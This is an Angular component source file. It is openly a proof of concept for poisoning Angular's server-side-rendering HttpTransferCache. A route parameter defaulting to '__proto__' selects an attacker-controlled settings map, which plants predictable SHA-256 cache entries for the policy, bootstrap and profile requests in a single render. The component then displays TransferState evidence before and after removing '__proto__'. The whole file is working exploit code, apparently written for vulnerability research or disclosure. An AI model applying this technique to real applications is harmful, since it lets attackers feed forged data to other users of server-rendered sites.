import {DOCUMENT} from '@angular/common';
import {HttpClient} from '@angular/common/http';
import {Component, REQUEST, TransferState, inject, makeStateKey, resource} from '@angular/core';
import {ActivatedRoute} from '@angular/router';
import {firstValueFrom} from 'rxjs';
import type {BootstrapConfig, Policy, Profile, StateEvidence} from '../../../core/poc.models';
import {buildPocUrls, captureStateEvidence, json} from '../shared/poc-helpers';

@Component({
  selector: 'app-multi-request',
  template: `
    <section class="card">
      <h2>multi-request HttpTransferCache poison</h2>
      <p>A single attacker-controlled settings dictionary plants several predictable SHA-256 cache entries for the same SSR render.</p>
    </section>
    <section class="card"><h3>Before HTTP lookups</h3><pre>{{ json(stateBeforeHttp.value()) }}</pre></section>
    <section class="card"><h3>Policy</h3><pre>{{ json(policy.value()) }}</pre></section>
    <section class="card"><h3>Bootstrap</h3><pre>{{ json(bootstrap.value()) }}</pre></section>
    <section class="card"><h3>Profile</h3><pre>{{ json(profile.value()) }}</pre></section>
    <section class="card"><h3>After remove('__proto__')</h3><pre>{{ json(stateAfterRemove.value()) }}</pre></section>
  `,
})
export class MultiRequestComponent {
  private readonly route = inject(ActivatedRoute);
  private readonly http = inject(HttpClient);
  private readonly transferState = inject(TransferState);
  private readonly request = inject(REQUEST, {optional: true});
  private readonly document = inject(DOCUMENT);

  protected readonly rawKey = this.route.snapshot.paramMap.get('key') ?? '__proto__';
  private readonly origin = new URL(this.request?.url ?? this.document.location?.href ?? 'http://127.0.0.1/').origin;
  private readonly urls = buildPocUrls(this.origin, this.rawKey);

  private readonly source = resource<Record<string, unknown>, string>({
    id: this.rawKey,
    params: () => this.urls.settingsMap,
    loader: ({params}) => firstValueFrom(this.http.get<Record<string, unknown>>(params, {transferCache: false})),
  });

  protected readonly stateBeforeHttp = resource<StateEvidence, true>({
    params: ({chain}) => (chain(this.source), true),
    loader: () => Promise.resolve(captureStateEvidence(this.transferState)),
  });

  protected readonly policy = resource<Policy, string>({
    params: ({chain}) => (chain(this.source), this.urls.policy),
    loader: ({params}) => firstValueFrom(this.http.get<Policy>(params)),
  });

  protected readonly bootstrap = resource<BootstrapConfig, string>({
    params: ({chain}) => (chain(this.source), this.urls.bootstrap),
    loader: ({params}) => firstValueFrom(this.http.get<BootstrapConfig>(params)),
  });

  protected readonly profile = resource<Profile, string>({
    params: ({chain}) => (chain(this.source), this.urls.profile),
    loader: ({params}) => firstValueFrom(this.http.get<Profile>(params)),
  });

  protected readonly stateAfterRemove = resource<StateEvidence, true>({
    params: ({chain}) => {
      chain(this.policy);
      chain(this.bootstrap);
      chain(this.profile);
      return true;
    },
    loader: () => {
      this.transferState.remove(makeStateKey(this.rawKey));
      return Promise.resolve(captureStateEvidence(this.transferState));
    },
  });

  protected readonly json = json;
}
